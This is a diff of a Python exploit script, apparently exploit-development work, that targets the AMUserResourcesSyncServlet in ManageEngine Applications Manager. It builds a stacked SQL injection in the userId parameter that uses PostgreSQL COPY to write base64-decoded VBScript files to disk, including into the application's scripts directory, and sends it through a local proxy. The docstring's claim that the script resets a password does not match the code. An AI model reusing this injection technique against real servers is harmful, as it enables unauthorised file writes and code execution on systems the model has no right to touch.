@@ -37,41 +37,40 @@ def readShellcode(path="./urlencoded_shellcode.txt"):
     f = open(path, "r")
     line = f.readline()
     f.close()
-    return line
+    return line.strip('\n')
 
 def test_inject(ip):
     """
     This will reset the password for the target user
     """
-    shellcode = getPayload().replace("\n","")
-    payload = "1;copy(select convert_from(decode($${}$$,$$base64$$),$$utf-8$$)) to $$C:\\Program Files (x86)\\ManageEngine\\AppManager12\\working\\conf\\application\\scripts\\wmiget7.vbs$$;".format(shellcode)
+    shellcode = readShellcode("base64_encoded_wmiget.txt")
+    #payload = "1;copy(select+convert_from(decode($${}$$,$$base64$$),$$utf-8$$))+to+$$C:\\Program+Files+(x86)\\ManageEngine\\AppManager12\\working\\conf\\application\\scripts\\test.vbs$$;".format(shellcode)
+    payload = "1;copy(select+convert_from(decode($${}$$,$$base64$$),$$utf-8$$))+to+$$C:\\\\test2.vbs$$;".format("SGVsbG8sIFdvcmxk")
     print('base64 shellcode: {}'.format(shellcode))
 
 
     print('(+) Attempting to inject url')
 
     #Target URL is: https://%s//servlet/AMUserResourcesSyncServlet?ForMasRange=&userId=?
-    url = "https://%s:8443/servlet/AMUserResourcesSyncServlet" % ip
+    url = "https://{}:8443/servlet/AMUserResourcesSyncServlet".format(ip)
     #payload = '1;select+pg_sleep(100);'
     #payload = '1;'
     params = {
-                "ForMasRange":"1",
-                #"userId": "1;copy(select convert_from(decode($${}$$,$$base64$$),$$utf-8$$)) to $$C:\\Program Files (x86)\\ManageEngine\\AppManager12\\working\\conf\\application\\scripts\\test13.vbs$$;".format(shellcode)
-                "userId":payload
-
-            }
+                "ForMasRange": "1",
+                "userId": payload
+             }
 
     proxies = {'http':'http://127.0.0.1:8080', 'https':'http://127.0.0.1:8080'}
 
     headers = {
-                'Content-Type':'application/x-www-form-urlencoded',
+                #'Content-Type':'application/x-www-form-urlencoded',
                 'Host':'manageengine:8443',
                 'User-Agent':'Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0',
                 'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                 'Accept-Language':'en-US,en;q=0.5',
                 'Accept-Encoding':'gzip, deflate'
             }
-    r = requests.post(url, data=params, proxies=proxies, verify=False)
+    r = requests.post(url, json=params, proxies=proxies, headers=headers, verify=False)
     print(r.text)
     print(r.headers)
     """
@@ -115,7 +114,8 @@ def main():
 
     ip = sys.argv[1]
 
-    #readShellcode()
+    #print(readShellcode("encoded_wmiget.txt"))
+    #print('test')
     test_inject(ip)
 
 if __name__ == "__main__":
